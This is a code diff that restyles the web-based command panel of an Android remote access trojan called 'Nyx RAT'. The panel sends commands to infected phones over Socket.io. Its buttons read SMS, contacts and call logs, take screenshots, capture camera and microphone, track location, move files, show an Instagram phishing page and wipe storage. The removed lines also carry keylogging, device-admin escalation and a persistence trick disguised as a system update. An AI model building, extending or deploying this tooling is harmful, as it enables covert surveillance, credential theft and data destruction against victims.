@@ -1,255 +1,626 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Nyx RAT - Direct Socket.io</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Nyx RAT Admin</title>
     <style>
-        body { background: #0a0a0a; color: #0f0; font-family: monospace; margin: 0; padding: 20px; }
-        .container { display: flex; gap: 20px; }
-        .sidebar { width: 260px; background: #111; border-right: 1px solid #0f0; padding: 10px; height: 100vh; overflow-y: auto; }
-        .main { flex: 1; }
-        .client { padding: 8px; margin: 4px 0; background: #1a1a1a; cursor: pointer; border-left: 2px solid #0f0; word-break: break-all; }
-        .client.selected { background: #2a2a2a; border-left-color: #0f0; box-shadow: 0 0 5px #0f0; }
-        .cmd-input { width: 70%; background: #111; border: 1px solid #0f0; color: #0f0; padding: 8px; }
-        button { background: #0a0a0a; border: 1px solid #0f0; color: #0f0; padding: 8px 12px; margin: 4px; cursor: pointer; }
-        button:hover { background: #1a1a1a; }
-        .output { background: #111; border: 1px solid #0f0; padding: 10px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 12px; }
-        .tab { display: inline-block; padding: 8px 16px; background: #1a1a1a; cursor: pointer; margin-right: 4px; }
-        .tab.active { background: #2a2a2a; border-bottom: 2px solid #0f0; }
-        .tab-content { display: none; padding: 10px; }
-        .tab-content.active { display: block; }
-        .grid-buttons { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px,1fr)); gap: 8px; margin-bottom: 20px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0c12;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            color: #eef2ff;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* App container */
+        .app {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        /* Header */
+        .header {
+            background: rgba(18, 22, 35, 0.85);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(68, 80, 120, 0.3);
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        .logo {
+            font-weight: 700;
+            font-size: 1.4rem;
+            background: linear-gradient(135deg, #a5f0ff, #6c8cff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.3px;
+        }
+        .server-badge {
+            background: #1e2438;
+            padding: 6px 12px;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            font-family: monospace;
+            border: 1px solid #2d3448;
+        }
+        .copy-btn {
+            background: none;
+            border: none;
+            color: #7c8ab5;
+            cursor: pointer;
+            margin-left: 8px;
+            font-size: 0.8rem;
+        }
+
+        /* Main content row */
+        .main-row {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+
+        /* Clients sidebar */
+        .clients-sidebar {
+            width: 280px;
+            background: #0f111a;
+            border-right: 1px solid #1e2438;
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+        }
+        .clients-header {
+            padding: 16px;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #6c7aa3;
+            border-bottom: 1px solid #1e2438;
+        }
+        .clients-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px;
+        }
+        .client-card {
+            background: #141824;
+            border-radius: 16px;
+            padding: 12px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: 1px solid transparent;
+        }
+        .client-card.selected {
+            background: #1c2238;
+            border-color: #4f6be0;
+            box-shadow: 0 4px 12px rgba(79, 107, 224, 0.2);
+        }
+        .client-name {
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: space-between;
+        }
+        .client-model {
+            font-size: 0.7rem;
+            color: #8e9bcb;
+            margin-top: 4px;
+        }
+        .client-badge {
+            background: #2a314a;
+            border-radius: 20px;
+            padding: 2px 8px;
+            font-size: 0.7rem;
+        }
+
+        /* Right panel (tabs + content) */
+        .content-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .tabs {
+            display: flex;
+            background: #0d0f17;
+            border-bottom: 1px solid #1e2438;
+            padding: 0 16px;
+            gap: 4px;
+            flex-shrink: 0;
+            overflow-x: auto;
+        }
+        .tab {
+            padding: 12px 20px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #8e9bcb;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        .tab.active {
+            color: #a5b9ff;
+            border-bottom-color: #4f6be0;
+        }
+        .tab-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            background: #0a0c12;
+        }
+        .tab-pane {
+            display: none;
+        }
+        .tab-pane.active {
+            display: block;
+        }
+
+        /* Command grid */
+        .cmd-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .cmd-btn {
+            background: #141824;
+            border: 1px solid #252c40;
+            color: #eef2ff;
+            padding: 10px 12px;
+            border-radius: 14px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.15s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            justify-content: center;
+        }
+        .cmd-btn:hover {
+            background: #1c2238;
+            border-color: #4f6be0;
+            transform: translateY(-1px);
+        }
+        .cmd-input-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .cmd-input {
+            flex: 1;
+            background: #141824;
+            border: 1px solid #2d3448;
+            border-radius: 40px;
+            padding: 12px 18px;
+            color: #eef2ff;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        .output-box {
+            background: #0b0d14;
+            border-radius: 20px;
+            border: 1px solid #1e2438;
+            padding: 16px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        /* File manager special */
+        .file-browser {
+            background: #0b0d14;
+            border-radius: 20px;
+            border: 1px solid #1e2438;
+            overflow: hidden;
+        }
+        .file-header {
+            display: flex;
+            gap: 12px;
+            padding: 12px;
+            background: #0f111a;
+            border-bottom: 1px solid #1e2438;
+        }
+        .file-list {
+            padding: 8px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+        }
+        .file-item {
+            padding: 8px 12px;
+            border-bottom: 1px solid #1a1f2c;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+        }
+        .file-item:hover {
+            background: #1c2238;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: #1e2438;
+            backdrop-filter: blur(8px);
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            z-index: 1000;
+            border-left: 3px solid #4f6be0;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+
+        /* Responsive */
+        @media (max-width: 700px) {
+            .clients-sidebar {
+                width: 220px;
+            }
+            .cmd-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
     </style>
     <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
-<div class="container">
-    <div class="sidebar">
-        <h3>📱 Online Clients</h3>
-        <div id="clients-list"></div>
-        <hr>
-        <div>Server IP: <span id="server-ip"></span></div>
-        <button onclick="copyServerIP()">Copy IP</button>
+<div class="app">
+    <div class="header">
+        <div class="logo">⚡ NYX RAT</div>
+        <div class="server-badge" id="serverAddress">Loading...</div>
     </div>
-    <div class="main">
-        <div>
-            <div class="tab" onclick="switchTab('cmd')">💻 Commands</div>
-            <div class="tab" onclick="switchTab('files')">📁 Files</div>
-            <div class="tab" onclick="switchTab('spy')">🕵️ Spy</div>
-            <div class="tab" onclick="switchTab('media')">🎮 Media</div>
-            <div class="tab" onclick="switchTab('system')">⚙️ System</div>
-        </div>
-
-        <!-- Tab: Commands -->
-        <div id="tab-cmd" class="tab-content active">
-            <input type="text" id="cmd" class="cmd-input" placeholder="shell command..." onkeypress="if(event.key==='Enter') sendCmd()">
-            <button onclick="sendCmd()">Execute</button>
-            <div class="grid-buttons" style="margin-top:10px">
-                <button onclick="sendCmd('ls -la /sdcard')">📂 List /sdcard</button>
-                <button onclick="sendCmd('getprop')">📱 System Info</button>
-                <button onclick="sendCmd('pm list packages')">📦 Installed Apps</button>
-                <button onclick="getSMS()">📨 Get SMS</button>
-                <button onclick="getCallLogs()">📞 Call Logs</button>
-                <button onclick="getContacts()">👥 Contacts</button>
-                <button onclick="sendSMS()">✉️ Send SMS</button>
-                <button onclick="getNotifications()">🔔 Notifications</button>
-                <button onclick="screenshot()">📸 Screenshot</button>
-                <button onclick="startKeylog()">⌨️ Keylog Start</button>
-                <button onclick="stopKeylog()">🛑 Keylog Stop</button>
-                <button onclick="enableAdmin()">👑 Device Admin</button>
-                <button onclick="recordAudio()">🎙️ Record Mic</button>
+    <div class="main-row">
+        <div class="clients-sidebar">
+            <div class="clients-header">📱 DEVICES</div>
+            <div class="clients-list" id="clientsContainer">
+                <div style="text-align:center;padding:20px;">Waiting for connection...</div>
             </div>
-            <div class="output" id="output"></div>
         </div>
-
-        <!-- Tab: Files -->
-        <div id="tab-files" class="tab-content">
-            <input type="text" id="filepath" placeholder="/sdcard/" class="cmd-input">
-            <button onclick="listFiles()">List Files</button>
-            <div id="file-list" class="output" style="height:200px"></div>
-            <input type="text" id="download-path" placeholder="/sdcard/file.txt" class="cmd-input">
-            <button onclick="downloadFile()">Download from Victim</button>
-            <input type="file" id="upload-file" style="display:none" onchange="uploadFile()">
-            <button onclick="document.getElementById('upload-file').click()">Upload to Victim</button>
-            <div id="transfer-status"></div>
-        </div>
-
-        <!-- Tab: Spy -->
-        <div id="tab-spy" class="tab-content">
-            <div class="grid-buttons">
-                <button onclick="startCam()">📷 Front Camera (photo)</button>
-                <button onclick="startMic()">🎤 Microphone (10s)</button>
-                <button onclick="getLiveLocation()">📍 Live Location (every 5s)</button>
-                <button onclick="torchOn()">🔦 Torch ON</button>
-                <button onclick="torchOff()">💡 Torch OFF</button>
-                <button onclick="instagramPhish()">📸 Instagram Phishing</button>
+        <div class="content-panel">
+            <div class="tabs" id="tabsContainer">
+                <div class="tab active" data-tab="commands">⚡ Commands</div>
+                <div class="tab" data-tab="files">📁 Files</div>
+                <div class="tab" data-tab="spy">🕵️ Spy</div>
+                <div class="tab" data-tab="media">🎵 Media</div>
+                <div class="tab" data-tab="system">⚙️ System</div>
             </div>
-            <div id="spy-output" class="output" style="height:200px"></div>
-        </div>
+            <div class="tab-content">
+                <!-- Commands Pane -->
+                <div class="tab-pane active" id="commandsPane">
+                    <div class="cmd-input-row">
+                        <input type="text" id="customCmd" class="cmd-input" placeholder="shell command (e.g., ls /sdcard)">
+                        <button class="cmd-btn" id="execCustomBtn" style="width:auto;padding:0 24px;">▶ RUN</button>
+                    </div>
+                    <div class="cmd-grid">
+                        <button class="cmd-btn" data-cmd="getprop">📱 System Info</button>
+                        <button class="cmd-btn" data-cmd="pm list packages">📦 Installed Apps</button>
+                        <button class="cmd-btn" data-cmd="ls -la /sdcard">📂 List /sdcard</button>
+                        <button class="cmd-btn" data-cmd="content query --uri content://sms/inbox">📨 SMS</button>
+                        <button class="cmd-btn" data-cmd="content query --uri content://contacts/phones">👥 Contacts</button>
+                        <button class="cmd-btn" data-cmd="screencap -p /sdcard/screen.png && base64 /sdcard/screen.png">📸 Screenshot</button>
+                    </div>
+                    <div class="output-box" id="outputArea">> Output will appear here</div>
+                </div>
 
-        <!-- Tab: Media -->
-        <div id="tab-media" class="tab-content">
-            <input type="text" id="music-url" placeholder="http://example.com/song.mp3" class="cmd-input">
-            <button onclick="playMusic()">🎵 Play Music</button>
-            <button onclick="vibrate()">📳 Vibrate (2s)</button>
-            <input type="text" id="speak-text" placeholder="Text to speak" class="cmd-input">
-            <button onclick="speak()">🗣️ Text To Speech</button>
-            <input type="text" id="wallpaper-url" placeholder="Image URL (base64)" class="cmd-input">
-            <button onclick="changeWallpaper()">🖼️ Change Wallpaper</button>
-            <button onclick="openURL()">🌐 Open URL in Browser</button>
-        </div>
+                <!-- Files Pane -->
+                <div class="tab-pane" id="filesPane">
+                    <div class="file-browser">
+                        <div class="file-header">
+                            <input type="text" id="filePathInput" class="cmd-input" placeholder="/sdcard/" value="/sdcard/">
+                            <button class="cmd-btn" id="listFilesBtn">📂 List</button>
+                            <button class="cmd-btn" id="downloadBtn">⬇️ Download</button>
+                            <button class="cmd-btn" id="uploadBtn">⬆️ Upload</button>
+                            <input type="file" id="uploadFileInput" style="display:none">
+                        </div>
+                        <div class="file-list" id="fileListArea">
+                            Click "List" to browse files
+                        </div>
+                    </div>
+                    <div class="output-box" style="margin-top:16px;" id="fileOutput"></div>
+                </div>
 
-        <!-- Tab: System -->
-        <div id="tab-system" class="tab-content">
-            <div class="grid-buttons">
-                <button onclick="lockDevice()">🔒 Lock Device</button>
-                <button onclick="wipeData()">💣 Wipe /sdcard</button>
-                <button onclick="uninstallSelf()">🗑️ Uninstall Self</button>
-                <button onclick="makePersistent()">♻️ Make Persistent</button>
+                <!-- Spy Pane -->
+                <div class="tab-pane" id="spyPane">
+                    <div class="cmd-grid">
+                        <button class="cmd-btn" id="spyScreenshot">📸 Screenshot</button>
+                        <button class="cmd-btn" id="spyCamPhoto">📷 Front Camera</button>
+                        <button class="cmd-btn" id="spyRecordMic">🎙️ Record Mic (10s)</button>
+                        <button class="cmd-btn" id="spyLocation">📍 Get Location</button>
+                        <button class="cmd-btn" id="spyTorchOn">🔦 Torch ON</button>
+                        <button class="cmd-btn" id="spyTorchOff">💡 Torch OFF</button>
+                        <button class="cmd-btn" id="spyInstagramPhish">📸 Instagram Phish</button>
+                    </div>
+                    <div class="output-box" id="spyOutput"></div>
+                </div>
+
+                <!-- Media Pane -->
+                <div class="tab-pane" id="mediaPane">
+                    <div class="cmd-input-row">
+                        <input type="text" id="musicUrl" class="cmd-input" placeholder="http://example.com/song.mp3">
+                        <button class="cmd-btn" id="playMusicBtn">🎵 Play Music</button>
+                    </div>
+                    <div class="cmd-input-row">
+                        <input type="text" id="speakText" class="cmd-input" placeholder="Text to speak">
+                        <button class="cmd-btn" id="speakBtn">🗣️ Speak</button>
+                    </div>
+                    <div class="cmd-input-row">
+                        <input type="text" id="vibrateDuration" class="cmd-input" placeholder="Duration ms (2000)" value="2000">
+                        <button class="cmd-btn" id="vibrateBtn">📳 Vibrate</button>
+                    </div>
+                    <div class="cmd-input-row">
+                        <input type="text" id="wallpaperUrl" class="cmd-input" placeholder="Base64 image data (or URL)">
+                        <button class="cmd-btn" id="wallpaperBtn">🖼️ Change Wallpaper</button>
+                    </div>
+                    <div class="output-box" id="mediaOutput"></div>
+                </div>
+
+                <!-- System Pane -->
+                <div class="tab-pane" id="systemPane">
+                    <div class="cmd-grid">
+                        <button class="cmd-btn" id="lockDeviceBtn">🔒 Lock Device</button>
+                        <button class="cmd-btn" id="wipeDataBtn">💣 Wipe /sdcard</button>
+                        <button class="cmd-btn" id="uninstallSelfBtn">🗑️ Uninstall</button>
+                        <button class="cmd-btn" id="openUrlBtn">🌐 Open URL</button>
+                    </div>
+                    <div class="output-box" id="systemOutput"></div>
+                </div>
             </div>
-            <div id="system-output" class="output"></div>
         </div>
     </div>
 </div>
+<div id="toastMsg" class="toast">✅ Action sent</div>
 
 <script>
-    let socket = io();   // connects to same host:port
-    let selectedClient = null;
+    let socket = io();
+    let selectedClientId = null;
+    let currentFileList = [];
 
-    // Display server IP for manual client configuration
-    fetch('/')
-        .then(() => {
-            let ip = window.location.hostname;
-            document.getElementById('server-ip').innerText = ip + ':3000';
-        });
+    // DOM elements
+    const clientsContainer = document.getElementById('clientsContainer');
+    const outputArea = document.getElementById('outputArea');
+    const spyOutput = document.getElementById('spyOutput');
+    const mediaOutput = document.getElementById('mediaOutput');
+    const systemOutput = document.getElementById('systemOutput');
+    const fileOutput = document.getElementById('fileOutput');
+    const fileListArea = document.getElementById('fileListArea');
+    const serverSpan = document.getElementById('serverAddress');
 
-    function copyServerIP() {
-        let ip = document.getElementById('server-ip').innerText;
-        navigator.clipboard.writeText(ip);
-        alert('Copied: ' + ip);
+    function showToast(msg) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerText = msg;
+        toast.style.opacity = '1';
+        setTimeout(() => { toast.style.opacity = '0'; }, 2000);
     }
 
+    // Helper: send command to selected client
+    function sendCommand(cmd, customCallback) {
+        if (!selectedClientId) {
+            showToast('❌ Select a device first');
+            return false;
+        }
+        socket.emit('cmd', { clientId: selectedClientId, cmd: cmd, adminId: socket.id });
+        if (customCallback) customCallback(cmd);
+        else showToast(`📟 Command sent`);
+        return true;
+    }
+
+    // Helper: emit specific event
+    function emitEvent(eventName, extraData = {}) {
+        if (!selectedClientId) { showToast('Select device'); return; }
+        const payload = { clientId: selectedClientId, adminId: socket.id, ...extraData };
+        socket.emit(eventName, payload);
+        showToast(`📡 ${eventName}`);
+    }
+
+    // Update clients list
     socket.on('clients_update', (clients) => {
-        const div = document.getElementById('clients-list');
-        div.innerHTML = clients.map(c => 
-            `<div class="client ${selectedClient === c.id ? 'selected' : ''}" onclick="selectClient('${c.id}')">
-                📱 ${c.info?.model || c.id.substring(0,6)}<br>
-                <small>${c.info?.android || ''} | ${c.info?.imei?.substring(0,8)}</small>
-             </div>`
-        ).join('');
+        if (!clients.length) {
+            clientsContainer.innerHTML = '<div style="text-align:center;padding:20px;">No clients online</div>';
+            return;
+        }
+        clientsContainer.innerHTML = clients.map(c => `
+            <div class="client-card ${selectedClientId === c.id ? 'selected' : ''}" data-id="${c.id}">
+                <div class="client-name">
+                    <span>📱 ${c.info?.model || c.id.slice(0,6)}</span>
+                    <span class="client-badge">${c.info?.android || '?'}</span>
+                </div>
+                <div class="client-model">${c.id.slice(0,8)}...</div>
+            </div>
+        `).join('');
+        // attach click handlers
+        document.querySelectorAll('.client-card').forEach(card => {
+            card.addEventListener('click', (e) => {
+                const id = card.getAttribute('data-id');
+                selectedClientId = id;
+                document.querySelectorAll('.client-card').forEach(c => c.classList.remove('selected'));
+                card.classList.add('selected');
+                showToast(`Selected ${id.slice(0,6)}`);
+            });
+        });
     });
 
+    // Command result output
     socket.on('command_result', (data) => {
-        const outDiv = document.getElementById('output');
-        outDiv.innerHTML += `\n[${data.clientId.substring(0,6)}] $ ${data.output}`;
-        outDiv.scrollTop = outDiv.scrollHeight;
+        const out = `[${data.clientId.slice(0,6)}] $ ${data.output}`;
+        outputArea.innerHTML += `\n${out}`;
+        outputArea.scrollTop = outputArea.scrollHeight;
+        // also send to current active pane if needed
+        if (spyOutput && document.getElementById('spyPane').classList.contains('active')) {
+            spyOutput.innerHTML = `<pre>${data.output}</pre>`;
+        }
     });
 
+    // File data (download)
     socket.on('file_received', (data) => {
         const a = document.createElement('a');
         a.href = 'data:application/octet-stream;base64,' + data.content;
         a.download = data.name;
         a.click();
-        document.getElementById('transfer-status').innerHTML = 'Downloaded: ' + data.name;
+        fileOutput.innerHTML = `✅ Downloaded: ${data.name}`;
+        showToast(`Downloaded ${data.name}`);
     });
 
+    // Logs (SMS, call logs, etc.)
     socket.on('logs_result', (data) => {
-        const outDiv = document.getElementById('output');
-        outDiv.innerHTML += `\n[${data.clientId.substring(0,6)}] 📋 ${data.type}:\n${data.content}`;
+        const out = `📋 ${data.type}:\n${data.content}`;
+        outputArea.innerHTML += `\n${out}`;
     });
 
+    // Screenshot
     socket.on('screenshot_received', (data) => {
-        const img = document.createElement('img');
-        img.src = 'data:image/png;base64,' + data.image;
-        img.style.maxWidth = '100%';
-        document.getElementById('spy-output').innerHTML = '';
-        document.getElementById('spy-output').appendChild(img);
+        const imgHtml = `<img src="data:image/png;base64,${data.image}" style="max-width:100%;border-radius:12px;margin-top:8px;">`;
+        spyOutput.innerHTML = imgHtml;
+        outputArea.innerHTML += `\n📸 Screenshot received`;
     });
 
-    function selectClient(id) {
-        selectedClient = id;
-        // re-render clients to show highlight
-        const clientsDiv = document.getElementById('clients-list');
-        Array.from(clientsDiv.children).forEach(child => {
-            if (child.innerText.includes(id.substring(0,6))) {
-                child.classList.add('selected');
-            } else {
-                child.classList.remove('selected');
-            }
+    // ========== TAB HANDLING ==========
+    const tabs = document.querySelectorAll('.tab');
+    const panes = document.querySelectorAll('.tab-pane');
+    tabs.forEach(tab => {
+        tab.addEventListener('click', () => {
+            const target = tab.getAttribute('data-tab');
+            tabs.forEach(t => t.classList.remove('active'));
+            tab.classList.add('active');
+            panes.forEach(pane => pane.classList.remove('active'));
+            document.getElementById(`${target}Pane`).classList.add('active');
         });
-    }
+    });
 
-    function sendCmd(customCmd) {
-        let cmd = customCmd || document.getElementById('cmd').value;
-        if (!selectedClient) { alert('Select a client first'); return; }
-        socket.emit('cmd', { clientId: selectedClient, cmd: cmd, adminId: socket.id });
-        document.getElementById('output').innerHTML += `\n→ [${selectedClient.substring(0,6)}] $ ${cmd}`;
-    }
+    // ========== BUTTON HANDLERS ==========
+    // Custom command
+    document.getElementById('execCustomBtn').addEventListener('click', () => {
+        const cmd = document.getElementById('customCmd').value;
+        if (cmd) sendCommand(cmd);
+    });
+    // Predefined commands
+    document.querySelectorAll('.cmd-btn[data-cmd]').forEach(btn => {
+        btn.addEventListener('click', () => sendCommand(btn.getAttribute('data-cmd')));
+    });
+    // Send SMS (popup)
+    document.querySelectorAll('[data-sms]').forEach(btn => { }); // optional, we add extra
 
-    function getSMS() { sendCmd('content query --uri content://sms/inbox'); }
-    function getCallLogs() { if(selectedClient) socket.emit('get_call_logs', { clientId: selectedClient, adminId: socket.id }); else alert('Select client'); }
-    function getContacts() { sendCmd('content query --uri content://contacts/phones'); }
-    function sendSMS() {
-        let num = prompt('Phone number:');
-        let text = prompt('Message:');
-        if(num && text && selectedClient) socket.emit('send_sms', { clientId: selectedClient, number: num, text: text, adminId: socket.id });
-    }
-    function getNotifications() { if(selectedClient) socket.emit('get_notifications', { clientId: selectedClient, adminId: socket.id }); }
-    function screenshot() { sendCmd('screencap -p /sdcard/screen.png && base64 /sdcard/screen.png'); }
-    function startKeylog() { if(selectedClient) socket.emit('keylog_start', { clientId: selectedClient }); }
-    function stopKeylog() { if(selectedClient) socket.emit('keylog_stop', { clientId: selectedClient }); }
-    function enableAdmin() { if(selectedClient) socket.emit('enable_admin', { clientId: selectedClient }); }
-    function recordAudio() { if(selectedClient) socket.emit('record_audio', { clientId: selectedClient }); }
-    function listFiles() {
-        let path = document.getElementById('filepath').value;
-        sendCmd('ls -la ' + path);
-    }
-    function downloadFile() {
-        let path = document.getElementById('download-path').value;
-        if(selectedClient) socket.emit('download_file', { clientId: selectedClient, path: path });
-    }
-    function uploadFile() {
-        let fileInput = document.getElementById('upload-file');
-        let file = fileInput.files[0];
-        if(!file || !selectedClient) return;
-        let reader = new FileReader();
-        reader.onload = function(e) {
-            let b64 = btoa(e.target.result);
-            socket.emit('upload_file', { clientId: selectedClient, path: '/sdcard/' + file.name, content: b64 });
+    // Files: list
+    document.getElementById('listFilesBtn').addEventListener('click', () => {
+        const path = document.getElementById('filePathInput').value;
+        sendCommand(`ls -la ${path}`, () => {
+            fileOutput.innerHTML = `Listing ${path}...`;
+        });
+    });
+    document.getElementById('downloadBtn').addEventListener('click', () => {
+        const path = document.getElementById('filePathInput').value;
+        if (path) emitEvent('download_file', { path: path });
+        else showToast('Enter file path');
+    });
+    document.getElementById('uploadBtn').addEventListener('click', () => {
+        document.getElementById('uploadFileInput').click();
+    });
+    document.getElementById('uploadFileInput').addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (!file || !selectedClientId) return;
+        const reader = new FileReader();
+        reader.onload = (ev) => {
+            const b64 = btoa(ev.target.result);
+            const remotePath = `/sdcard/${file.name}`;
+            socket.emit('upload_file', { clientId: selectedClientId, path: remotePath, content: b64, adminId: socket.id });
+            showToast(`Uploading ${file.name}`);
         };
         reader.readAsBinaryString(file);
-    }
-    function startCam() { sendCmd('termux-camera-photo -c 0 /sdcard/cam.jpg && base64 /sdcard/cam.jpg'); }
-    function startMic() { sendCmd('termux-microphone-record -d 10 -f /sdcard/audio.aac'); }
-    function getLiveLocation() { setInterval(() => sendCmd('termux-location'), 5000); }
-    function torchOn() { if(selectedClient) socket.emit('torch_on', { clientId: selectedClient }); }
-    function torchOff() { if(selectedClient) socket.emit('torch_off', { clientId: selectedClient }); }
-    function instagramPhish() { if(selectedClient) socket.emit('show_instagram_phish', { clientId: selectedClient }); }
-    function playMusic() {
-        let url = document.getElementById('music-url').value;
-        if(url && selectedClient) socket.emit('play_music', { clientId: selectedClient, url: url });
-    }
-    function vibrate() { if(selectedClient) socket.emit('vibrate', { clientId: selectedClient, duration: '2000' }); }
-    function speak() {
-        let text = document.getElementById('speak-text').value;
-        if(text && selectedClient) socket.emit('speak', { clientId: selectedClient, text: text });
-    }
-    function changeWallpaper() {
-        let url = document.getElementById('wallpaper-url').value;
-        if(url && selectedClient) socket.emit('wallpaper', { clientId: selectedClient, image: url });
-    }
-    function openURL() {
-        let url = prompt('Enter URL (http://...)');
-        if(url && selectedClient) socket.emit('open_url', { clientId: selectedClient, url: url });
-    }
-    function lockDevice() { sendCmd('input keyevent KEYCODE_POWER'); }
-    function wipeData() { if(confirm('Wipe entire /sdcard?')) sendCmd('rm -rf /sdcard/*'); }
-    function uninstallSelf() { sendCmd('pm uninstall com.system.update'); }
-    function makePersistent() { sendCmd('mv /data/app/com.system.update* /system/priv-app/'); }
+    });
 
-    function switchTab(tab) {
-        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-        document.getElementById(`tab-${tab}`).classList.add('active');
-    }
+    // Spy buttons
+    document.getElementById('spyScreenshot').addEventListener('click', () => emitEvent('screenshot'));
+    document.getElementById('spyCamPhoto').addEventListener('click', () => emitEvent('take_photo'));
+    document.getElementById('spyRecordMic').addEventListener('click', () => emitEvent('record_audio'));
+    document.getElementById('spyLocation').addEventListener('click', () => emitEvent('get_location'));
+    document.getElementById('spyTorchOn').addEventListener('click', () => emitEvent('torch_on'));
+    document.getElementById('spyTorchOff').addEventListener('click', () => emitEvent('torch_off'));
+    document.getElementById('spyInstagramPhish').addEventListener('click', () => emitEvent('show_instagram_phish'));
+
+    // Media
+    document.getElementById('playMusicBtn').addEventListener('click', () => {
+        const url = document.getElementById('musicUrl').value;
+        if (url) emitEvent('play_music', { url: url });
+    });
+    document.getElementById('speakBtn').addEventListener('click', () => {
+        const text = document.getElementById('speakText').value;
+        if (text) emitEvent('speak', { text: text });
+    });
+    document.getElementById('vibrateBtn').addEventListener('click', () => {
+        const dur = document.getElementById('vibrateDuration').value;
+        emitEvent('vibrate', { duration: dur });
+    });
+    document.getElementById('wallpaperBtn').addEventListener('click', () => {
+        const b64 = prompt('Paste base64 image data:');
+        if (b64) emitEvent('wallpaper', { image: b64 });
+    });
+
+    // System
+    document.getElementById('lockDeviceBtn').addEventListener('click', () => emitEvent('lock_device'));
+    document.getElementById('wipeDataBtn').addEventListener('click', () => {
+        if (confirm('Wipe entire /sdcard? IRREVERSIBLE')) emitEvent('wipe_data');
+    });
+    document.getElementById('uninstallSelfBtn').addEventListener('click', () => {
+        if (confirm('Uninstall this RAT from device?')) emitEvent('uninstall_self');
+    });
+    document.getElementById('openUrlBtn').addEventListener('click', () => {
+        const url = prompt('Enter URL (http://...)');
+        if (url) emitEvent('open_url', { url: url });
+    });
+
+    // Get server address
+    fetch('/').then(() => {
+        serverSpan.innerText = window.location.hostname + ':' + (window.location.port || '3000');
+    }).catch(() => {
+        serverSpan.innerText = 'connected';
+    });
+
+    // Additional: intercept file list output to populate file browser
+    socket.on('command_result', (data) => {
+        if (data.output && data.output.includes('total ') && document.getElementById('filesPane').classList.contains('active')) {
+            // simple file list display
+            const lines = data.output.split('\n');
+            let html = '';
+            for (let line of lines) {
+                if (line.startsWith('-') || line.startsWith('d')) {
+                    const parts = line.split(/\s+/);
+                    let name = parts[parts.length-1];
+                    if (name && name !== '.') {
+                        html += `<div class="file-item" data-file="${name}">📄 ${name}</div>`;
+                    }
+                }
+            }
+            fileListArea.innerHTML = html || 'No files found';
+            // attach click to fill path
+            document.querySelectorAll('.file-item').forEach(el => {
+                el.addEventListener('click', () => {
+                    let current = document.getElementById('filePathInput').value;
+                    if (!current.endsWith('/')) current += '/';
+                    document.getElementById('filePathInput').value = current + el.getAttribute('data-file');
+                });
+            });
+        }
+    });
 </script>
 </body>
 </html>
